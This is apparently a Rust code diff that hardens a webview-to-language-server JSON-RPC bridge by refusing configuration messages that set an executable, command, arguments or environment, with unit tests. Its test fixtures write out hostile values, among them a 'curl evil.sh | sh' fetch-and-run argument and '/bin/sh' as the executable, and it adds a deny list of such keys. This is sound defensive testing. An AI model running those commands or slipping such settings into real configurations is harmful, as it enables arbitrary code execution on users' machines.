@@ -1948,6 +1948,48 @@ fn encode_json_rpc(message: &Value) -> Result<(Vec<u8>, usize), LanguageServiceE
     Ok((frame, body.len()))
 }
 
+/// Settings keys that let a language server choose a program to run, or the
+/// arguments and environment it runs with. texlab honours
+/// `texlab.build.executable` and `texlab.forwardSearch.executable`; the same
+/// shape exists in other servers.
+const EXECUTABLE_SETTING_KEYS: [&str; 5] = ["executable", "command", "args", "argv", "env"];
+
+/// The JSON-RPC bridge forwards whatever method the webview asks for, so
+/// `workspace/didChangeConfiguration` would otherwise let anything running in
+/// the webview point a language server at an arbitrary binary and have it
+/// spawned - turning script execution into process execution.
+///
+/// The app's own configuration is a pinned profile that only ever sets
+/// behavioural flags (`texlab.build.onSave`), so refusing executable-selecting
+/// keys costs nothing and closes the escalation. Scans the whole payload: the
+/// keys sit several levels deep under a server-specific namespace.
+fn reject_executable_settings(value: &Value) -> Result<(), String> {
+    match value {
+        Value::Object(map) => {
+            for (key, child) in map {
+                if EXECUTABLE_SETTING_KEYS
+                    .iter()
+                    .any(|candidate| key.eq_ignore_ascii_case(candidate))
+                {
+                    return Err(format!(
+                        "language-server configuration may not set `{key}`: the executable, its \
+                         arguments and its environment are owned by the application"
+                    ));
+                }
+                reject_executable_settings(child)?;
+            }
+            Ok(())
+        }
+        Value::Array(items) => {
+            for item in items {
+                reject_executable_settings(item)?;
+            }
+            Ok(())
+        }
+        _ => Ok(()),
+    }
+}
+
 fn validate_json_rpc_value(message: &Value) -> Result<(), String> {
     let object = message
         .as_object()
@@ -1980,6 +2022,11 @@ fn validate_json_rpc_value(message: &Value) -> Result<(), String> {
         }
         if let Some(id) = object.get("id") {
             validate_json_rpc_id(id, false)?;
+        }
+        if method == "workspace/didChangeConfiguration" {
+            if let Some(params) = object.get("params") {
+                reject_executable_settings(params)?;
+            }
         }
         return Ok(());
     }
@@ -2242,6 +2289,48 @@ mod tests {
 
     fn frame(value: &Value) -> Vec<u8> {
         encode_json_rpc(value).expect("valid frame").0
+    }
+
+    #[test]
+    fn configuration_may_not_select_an_executable() {
+        // The shipped profile only flips a behavioural flag, so it must pass.
+        assert!(validate_json_rpc_value(&json!({
+            "jsonrpc": "2.0",
+            "method": "workspace/didChangeConfiguration",
+            "params": {"settings": {"texlab": {"build": {"onSave": false}}}},
+        }))
+        .is_ok());
+
+        // Anything that picks a program, its arguments or its environment is
+        // refused however deeply it is nested, and whatever its casing.
+        for settings in [
+            json!({"settings": {"texlab": {"build": {"executable": "/bin/sh"}}}}),
+            json!({"settings": {"texlab": {"build": {"Executable": "/bin/sh"}}}}),
+            json!({"settings": {"texlab": {"forwardSearch": {"executable": "/bin/sh"}}}}),
+            json!({"settings": {"texlab": {"build": {"args": ["-c", "curl evil.sh | sh"]}}}}),
+            json!({"settings": {"texlab": {"build": {"env": {"PATH": "/tmp"}}}}}),
+            json!({"settings": [{"nested": [{"command": "/bin/sh"}]}]}),
+        ] {
+            let message = json!({
+                "jsonrpc": "2.0",
+                "method": "workspace/didChangeConfiguration",
+                "params": settings,
+            });
+            assert!(
+                validate_json_rpc_value(&message).is_err(),
+                "expected rejection for {message}"
+            );
+        }
+
+        // The restriction is scoped to configuration: ordinary traffic that
+        // happens to carry such a word is untouched.
+        assert!(validate_json_rpc_value(&json!({
+            "jsonrpc": "2.0",
+            "id": 1,
+            "method": "workspace/executeCommand",
+            "params": {"command": "texlab.build"},
+        }))
+        .is_ok());
     }
 
     fn request(id: u64, method: &str) -> Value {
